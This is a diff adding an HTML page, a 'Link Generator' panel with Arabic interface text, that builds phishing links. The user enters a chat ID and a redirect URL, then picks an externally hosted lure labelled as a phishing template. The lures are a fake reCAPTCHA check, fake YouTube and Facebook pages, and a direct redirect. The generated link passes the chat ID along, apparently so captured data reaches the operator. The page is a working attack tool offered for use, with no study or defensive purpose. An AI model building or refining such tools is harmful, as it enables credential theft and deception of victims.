@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Link Generator Panel</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: #000;
+            color: #00ff00;
+            font-family: 'Share Tech Mono', monospace;
+            margin: 0;
+            padding: 20px;
+            overflow-x: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        canvas { position: fixed; top: 0; left: 0; z-index: -1; }
+        header h1 {
+            font-size: 2.2em;
+            text-shadow: 0 0 15px #0f0;
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+        }
+        .card { 
+            background: rgba(0, 0, 0, 0.85); 
+            border: 1px solid #0f0; 
+            border-radius: 10px; 
+            padding: 1.5rem; 
+            width: 100%;
+            max-width: 600px; 
+            margin: 1rem auto; 
+            box-shadow: 0 0 25px rgba(2, 255, 2, 0.4); 
+            animation: fadeIn 1.5s ease-in-out; 
+            text-align: center; 
+        }
+        .input-group, .template-group {
+            margin-bottom: 25px;
+        }
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 1.2em;
+            font-family: 'Cairo', sans-serif;
+            text-align: center;
+        }
+        input[type="text"], input[type="url"] {
+            width: 95%;
+            padding: 0.8rem;
+            margin: 0 auto 1rem auto;
+            display: block;
+            border: 2px solid #0f0;
+            border-radius: 8px;
+            background: #000;
+            color: #0f0;
+            font-size: 1.1rem;
+            text-align: center;
+            font-family: 'Share Tech Mono', monospace;
+        }
+        input::placeholder { color: rgba(0, 255, 0, 0.5); }
+        
+        .options-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 10px;
+        }
+        .option-btn {
+            background: #111;
+            border: 2px solid #0f0;
+            border-radius: 8px;
+            padding: 15px 10px;
+            cursor: pointer;
+            transition: background-color 0.3s, box-shadow 0.3s;
+            font-family: 'Cairo', sans-serif;
+            color: #0f0;
+        }
+        .option-btn:hover {
+            background: #0f0;
+            color: #000;
+        }
+        .option-btn.selected {
+            background: #0f0;
+            color: #000;
+            box-shadow: 0 0 15px #0f0;
+        }
+
+        button#generateBtn {
+            width: 95%;
+            padding: 0.8rem;
+            background: #0f0;
+            color: #000;
+            font-weight: bold;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.3s;
+            font-size: 1.2rem;
+            font-family: 'Cairo', sans-serif;
+            margin-top: 10px;
+        }
+        button#generateBtn:hover {
+            background: #111;
+            color: #0f0;
+            border: 2px solid #0f0;
+        }
+        .result-group {
+            margin-top: 25px;
+            display: none;
+        }
+        #finalLink {
+            direction: ltr;
+            text-align: left;
+            background-color: #000;
+            padding: 12px;
+            border-radius: 8px;
+            word-wrap: break-word;
+            border: 1px solid #0f0;
+            cursor: pointer;
+            color: #fff;
+            font-size: 1.1em;
+        }
+        .copy-feedback {
+            margin-top: 10px;
+            color: #0f0;
+            font-weight: bold;
+            display: none;
+        }
+        @keyframes fadeIn { from {opacity: 0; transform: translateY(-20px);} to {opacity: 1; transform: translateY(0);} }
+    </style>
+</head>
+<body>
+
+    <canvas id="matrix"></canvas>
+
+    <div class="card">
+        <header><h1>Link Generator</h1></header>
+        
+        <div class="input-group">
+            <label for="chatId">Your Chat ID</label>
+            <input type="text" id="chatId" placeholder="أدخل الـ ID (إجباري)">
+        </div>
+
+        <div class="input-group">
+            <label for="originalLink">Target URL</label>
+            <input type="url" id="originalLink" placeholder="https://example.com">
+        </div>
+        
+        <div class="template-group">
+            <label>Choose Phishing Template</label>
+            <div class="options-grid" id="template-options">
+                <div class="option-btn" data-url="https://333uruf.netlify.app/toweb.html">تحويل مباشر</div>
+                <div class="option-btn" data-url="https://333uruf.netlify.app/re.html">تحقق ReCaptcha</div>
+                <div class="option-btn" data-url="https://333uruf.netlify.app/yo.html">صفحة YouTube</div>
+                <div class="option-btn" data-url="https://333uruf.netlify.app/fa.html">صفحة Facebook</div>
+            </div>
+        </div>
+
+        <button id="generateBtn">Generate Link</button>
+
+        <div class="result-group" id="resultGroup">
+            <label>Final Link (Click to Copy)</label>
+            <div id="finalLink" title="اضغط للنسخ"></div>
+            <div class="copy-feedback" id="copyFeedback">تم النسخ بنجاح!</div>
+        </div>
+    </div>
+
+    <script>
+        // Matrix Effect (unchanged)
+        const canvas = document.getElementById("matrix");
+        const ctx = canvas.getContext("2d");
+        canvas.height = window.innerHeight;
+        canvas.width = window.innerWidth;
+        const letters = "01";
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+        for (let x = 0; x < columns; x++) drops[x] = 1;
+        function draw() {
+            ctx.fillStyle = "rgba(0,0,0,0.05)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#0f0";
+            ctx.font = fontSize + "px monospace";
+            for (let i = 0; i < drops.length; i++) {
+                const text = letters.charAt(Math.floor(Math.random() * letters.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(draw, 35);
+
+        // --- UPDATED LOGIC ---
+        const generateBtn = document.getElementById('generateBtn');
+        const chatIdInput = document.getElementById('chatId');
+        const originalLinkInput = document.getElementById('originalLink');
+        const resultGroup = document.getElementById('resultGroup');
+        const finalLinkDiv = document.getElementById('finalLink');
+        const copyFeedback = document.getElementById('copyFeedback');
+        
+        const templateOptions = document.querySelectorAll('#template-options .option-btn');
+        let selectedTemplateURL = "";
+
+        // Handle template selection
+        templateOptions.forEach(option => {
+            option.addEventListener('click', () => {
+                templateOptions.forEach(opt => opt.classList.remove('selected'));
+                option.classList.add('selected');
+                selectedTemplateURL = option.getAttribute('data-url');
+            });
+        });
+
+        // Handle link generation
+        generateBtn.addEventListener('click', () => {
+            const chatId = chatIdInput.value.trim();
+            const originalLink = originalLinkInput.value.trim();
+
+            // --- التعديل هنا: التأكد من أن الحقول ليست فارغة ---
+            if (!chatId) {
+                alert('الرجاء إدخال Chat ID. هذا الحقل إجباري.');
+                return;
+            }
+            if (!originalLink) {
+                alert('الرجاء إدخال رابط إعادة التوجيه.');
+                return;
+            }
+            if (!selectedTemplateURL) {
+                alert('الرجاء اختيار واجهة التصيد.');
+                return;
+            }
+
+            let formattedLink = originalLink;
+            if (!/^https?:\/\//i.test(formattedLink)) {
+                formattedLink = 'https://' + formattedLink;
+            }
+
+            const encodedRedirectURL = encodeURIComponent(formattedLink);
+            const finalURL = `${selectedTemplateURL}?chatId=${chatId}&originalLink=${encodedRedirectURL}`;
+
+            finalLinkDiv.textContent = finalURL;
+            resultGroup.style.display = 'block';
+            copyFeedback.style.display = 'none';
+        });
+
+        // Handle copying the link (unchanged)
+        finalLinkDiv.addEventListener('click', () => {
+            if (finalLinkDiv.textContent) {
+                navigator.clipboard.writeText(finalLinkDiv.textContent)
+                    .then(() => {
+                        copyFeedback.style.display = 'block';
+                        setTimeout(() => { copyFeedback.style.display = 'none'; }, 2000);
+                    })
+                    .catch(err => {
+                        console.error('Failed to copy text: ', err);
+                        alert('فشل نسخ الرابط.');
+                    });
+            }
+        });
+    </script>
+
+</body>
+</html>
+
